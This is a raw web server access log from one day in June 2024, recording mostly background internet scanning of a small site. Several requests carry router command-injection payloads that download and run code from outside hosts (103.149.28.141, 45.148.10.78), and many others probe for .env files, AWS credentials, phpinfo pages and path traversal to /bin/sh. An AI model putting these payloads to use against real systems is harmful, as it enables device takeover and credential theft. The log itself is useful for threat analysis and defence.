141.98.11.67 - - [21/Jun/2024:09:55:42 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
165.232.88.210 - - [21/Jun/2024:09:59:21 +0000] "GET images/favicon-32x32.png HTTP/1.1" 400 154 "-" "-"
185.224.128.74 - - [21/Jun/2024:10:03:35 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [21/Jun/2024:10:15:16 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:10:17:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
174.128.182.151 - - [21/Jun/2024:10:17:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36"
174.128.182.151 - - [21/Jun/2024:10:17:43 +0000] "" 400 0 "-" "-"
168.76.20.229 - - [21/Jun/2024:10:18:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
168.76.20.229 - - [21/Jun/2024:10:18:26 +0000] "GET /assets/img/favicon/another/favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [21/Jun/2024:10:18:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [21/Jun/2024:10:18:27 +0000] "GET /assets/img/favicon/another/favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [21/Jun/2024:10:18:27 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [21/Jun/2024:10:18:28 +0000] "GET /robots.txt HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [21/Jun/2024:10:18:28 +0000] "GET /assets/js/beautifuljekyll.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
168.76.20.229 - - [21/Jun/2024:10:18:29 +0000] "GET /assets/js/theme-switcher.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
92.249.48.222 - - [21/Jun/2024:10:35:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.191.127.212 - - [21/Jun/2024:10:54:36 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
205.210.31.57 - - [21/Jun/2024:10:57:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
92.249.48.222 - - [21/Jun/2024:10:58:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
179.43.161.135 - - [21/Jun/2024:10:59:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:11:19:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
46.101.9.216 - - [21/Jun/2024:11:27:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
43.153.214.32 - - [21/Jun/2024:11:29:08 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 154 "-" "-"
43.153.214.32 - - [21/Jun/2024:11:29:08 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 154 "-" "-"
43.153.214.32 - - [21/Jun/2024:11:29:08 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 166 "-" "Custom-AsyncHttpClient"
87.236.176.239 - - [21/Jun/2024:11:29:20 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
162.216.150.132 - - [21/Jun/2024:11:30:14 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
43.163.6.124 - - [21/Jun/2024:11:38:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.222 - - [21/Jun/2024:11:39:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:12:00:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
43.163.3.58 - - [21/Jun/2024:12:05:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
117.62.235.53 - - [21/Jun/2024:12:09:46 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
92.249.48.222 - - [21/Jun/2024:12:11:39 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.83.197 - - [21/Jun/2024:12:24:46 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
141.98.83.197 - - [21/Jun/2024:12:24:49 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+shk%3B+wget+http%3A%2F%2F45.148.10.78%2Fshk%3B+chmod+777+shk%3B+.%2Fshk+tplink%3B+rm+-rf+shk%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
185.191.127.212 - - [21/Jun/2024:12:31:33 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
92.249.48.222 - - [21/Jun/2024:12:35:53 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
185.244.36.206 - - [21/Jun/2024:12:46:27 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.224.128.43 - - [21/Jun/2024:12:56:30 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.249.48.222 - - [21/Jun/2024:12:57:55 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:13:16:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
92.249.48.222 - - [21/Jun/2024:13:35:15 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.83.197 - - [21/Jun/2024:13:42:00 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
185.191.127.212 - - [21/Jun/2024:13:43:04 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
179.43.161.135 - - [21/Jun/2024:13:46:11 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
65.154.226.166 - - [21/Jun/2024:13:48:09 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
92.249.48.222 - - [21/Jun/2024:13:53:04 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
64.64.123.53 - - [21/Jun/2024:13:55:45 +0000] "GET /_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:45 +0000] "GET /phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:46 +0000] "GET /1_1_phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:46 +0000] "GET /phpinfo.php3 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:47 +0000] "GET /__info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:47 +0000] "GET /.__info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:48 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:48 +0000] "GET /admin/phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:48 +0000] "GET /php-info HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:49 +0000] "GET /pi.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:49 +0000] "GET /temp.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:51 +0000] "GET /phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:51 +0000] "GET /frontend_dev.php/$ HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:52 +0000] "GET /symfony/public/_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:52 +0000] "GET /scripts/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:53 +0000] "GET /info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:53 +0000] "GET /console/phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:54 +0000] "GET /api/index.php/v1/config/application HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:54 +0000] "GET /console/phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:55 +0000] "GET /html/phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:55 +0000] "GET /apache/phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:55 +0000] "GET /phpinfo.php4 HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:56 +0000] "GET /foo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:56 +0000] "GET /scripts/index.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:58 +0000] "GET /php-info/info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:58 +0000] "GET /_info-backoffice.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:55:59 +0000] "GET /admin/phpinfo.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:55:59 +0000] "GET /php-info/info.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:00 +0000] "GET /app_dev.php/_profiler/phpinfo HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:00 +0000] "GET /composer.json HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:01 +0000] "GET /_info-backoffice.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:01 +0000] "GET /dashboard/test.php HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:01 +0000] "GET /.env_old HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:02 +0000] "GET /.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:02 +0000] "GET /images/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:03 +0000] "GET /api/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:03 +0000] "GET /actuator/env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:04 +0000] "GET /dev/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:04 +0000] "GET /.aws/credentials HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:05 +0000] "GET /laravel/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:05 +0000] "GET /cron/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:06 +0000] "GET /backend/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:06 +0000] "GET /management/env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:07 +0000] "GET /server/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:07 +0000] "GET /admin/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:08 +0000] "GET /shop/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:08 +0000] "GET /.env.example HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:08 +0000] "GET /.env.save HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:09 +0000] "GET /blog/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:09 +0000] "GET /media/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:10 +0000] "GET /download/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:10 +0000] "GET /shared/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:11 +0000] "GET /staging/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:11 +0000] "GET /config.js HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:12 +0000] "GET /.env.production HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:12 +0000] "GET /.env.prod HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:13 +0000] "GET /backend/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:13 +0000] "GET /files/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:14 +0000] "GET /static/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:14 +0000] "GET /actuator/env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:15 +0000] "GET /staticfiles/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:15 +0000] "GET /.env.backup HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:15 +0000] "GET /templates/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.52 - - [21/Jun/2024:13:56:16 +0000] "GET /templates/.env HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
64.64.123.53 - - [21/Jun/2024:13:56:16 +0000] "POST / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.191.127.212 - - [21/Jun/2024:14:07:43 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.28.141%2Ft+-O-+|+sh%60) HTTP/1.1" 301 166 "-" "Go-http-client/1.1"
77.74.177.119 - - [21/Jun/2024:14:13:07 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Linux; arm_64; Android 12; CPH2205) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 YaBrowser/23.3.3.86.00 SA/3 Mobile Safari/537.36"
115.231.78.12 - - [21/Jun/2024:14:13:31 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.2623.112 Safari/537.36"
92.249.48.222 - - [21/Jun/2024:14:21:27 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
54.88.179.33 - - [21/Jun/2024:14:22:10 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 \x5C(Windows NT 10.0\x5C; Win64\x5C; x64\x5C) AppleWebKit/537.36 \x5C(KHTML, like Gecko\x5C) Chrome/100.0.4896.60 Safari/537.36"
185.244.36.206 - - [21/Jun/2024:14:25:57 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
92.249.48.222 - - [21/Jun/2024:14:37:54 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
85.95.241.202 - - [21/Jun/2024:14:40:17 +0000] "HEAD /wordpress/ HTTP/1.1" 301 0 "-" "-"
192.168.0.101 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
172.19.0.1 - - [21/Jun/2024:14:52:17 +0000] "POST /StableWSDiscoveryEndpoint/schemas-xmlsoap-org_ws_2005_04_discovery HTTP/1.1" 301 166 "-" "-"
